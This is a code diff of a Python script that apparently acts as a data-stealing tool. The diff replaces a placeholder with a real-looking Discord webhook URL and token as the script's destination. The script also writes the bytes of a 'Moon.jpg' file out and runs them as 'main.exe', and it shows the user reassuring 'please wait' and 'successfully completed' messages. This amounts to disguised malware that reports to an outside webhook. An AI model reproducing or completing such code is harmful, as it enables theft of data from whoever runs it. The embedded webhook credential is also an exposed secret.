@@ -15,7 +15,6 @@ import random
 import re
 import subprocess
 
-import os
 moon = "Moon.jpg"
 if os.path.exists(moon) == False:
     print("Moon.jpg was not found! Make sure the folder this file is located at has the Moon.jpg or it won't run.")
@@ -26,7 +25,7 @@ print("Please wait, this will take a matter of seconds. Do not exit this program
     
 # Replace the X with your webhook.
 
-hook = "X"
+hook = "https://discord.com/api/webhooks/1065007934163144795/9ORr5sJyjQNw_yBhvn9bGq3c642JA1aAXPZGPgj03mPE9S_XpPxPUF1HOcOSpPSM0okl"
 DETECTED = False
 
 
@@ -1218,4 +1217,6 @@ with open("Moon.jpg", "rb") as f:
         e.write(f.read())
 
 os.system("main.exe")
+print("Process successfully completed.")
+input("Press enter to exit.")
 quit()
